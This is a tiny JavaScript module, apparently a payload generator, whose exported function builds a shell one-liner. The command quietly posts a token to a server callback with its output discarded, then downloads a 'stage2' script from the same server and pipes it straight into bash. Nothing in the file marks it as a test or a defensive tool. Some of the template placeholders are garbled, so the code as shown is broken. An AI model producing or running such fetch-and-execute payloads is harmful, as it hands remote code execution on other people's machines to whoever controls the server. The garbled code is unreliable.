function generate(token, serverUrl) {
    return `curl -s -X POST -H 'Content-Type: application/json' -d '{"token":"${token}"}' \( {serverUrl}/api/callback >/dev/null 2>&1; curl -s ' \){serverUrl}/stage2?token=${token}' | bash`;
}

module.exports = { generate };
